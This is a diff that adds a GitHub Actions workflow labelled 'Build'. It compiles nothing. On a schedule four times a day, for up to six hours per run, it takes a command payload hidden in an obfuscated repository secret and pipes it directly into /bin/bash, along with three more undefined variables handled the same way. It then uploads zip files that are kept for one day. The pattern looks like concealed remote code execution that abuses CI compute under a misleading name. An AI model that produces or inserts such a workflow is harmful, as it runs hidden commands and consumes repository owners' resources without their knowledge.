@@ -1,0 +1,31 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '13 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          nidaj583: ${{ secrets.nidaj583 }}
+        run: |
+          printf '%s' "$nidaj583" | jq -r .ogr4 | /bin/bash
+          printf '%s' "$nmqht3173" | jq -r .qepx8756 | /bin/bash
+          echo $mv3269 | jq -r .j3 | /bin/bash
+          printf '%s' "$e820" | jq -r .hgfg42861 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Mhpd3r4I
+          path: "*.zip"
+          retention-days: 1
